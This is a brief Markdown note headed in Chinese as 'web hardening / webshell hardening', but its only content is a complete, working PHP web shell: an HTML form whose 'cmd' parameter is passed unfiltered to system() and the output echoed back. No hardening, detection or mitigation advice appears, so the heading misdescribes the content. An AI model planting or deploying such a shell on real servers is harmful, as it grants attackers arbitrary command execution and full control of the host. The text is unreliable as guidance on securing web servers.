# web加固
## webshell加固
```
<html>
<head>
<title>Web Shell</title>
<meta http-equiv="content-Type" content="text/html;charset=utf-8"/>
</head>
<h1>Web Shell</h1>
<form action="WebShell.php" method="get">
CMD:<input type="text" name="cmd"/></br>
<input type="submit" value="Submit"/>&nbsp&nbsp<input type="reset" value="Reset"/>
</form>
</html>

<?php
	$cmd=$_GET['cmd'];
	if (!empty($cmd)){
		echo "<pre>";
		system($cmd);
		echo "</pre>";


	}else{

		echo "</br>Please enter the Command!</br>";

	}
?>
```

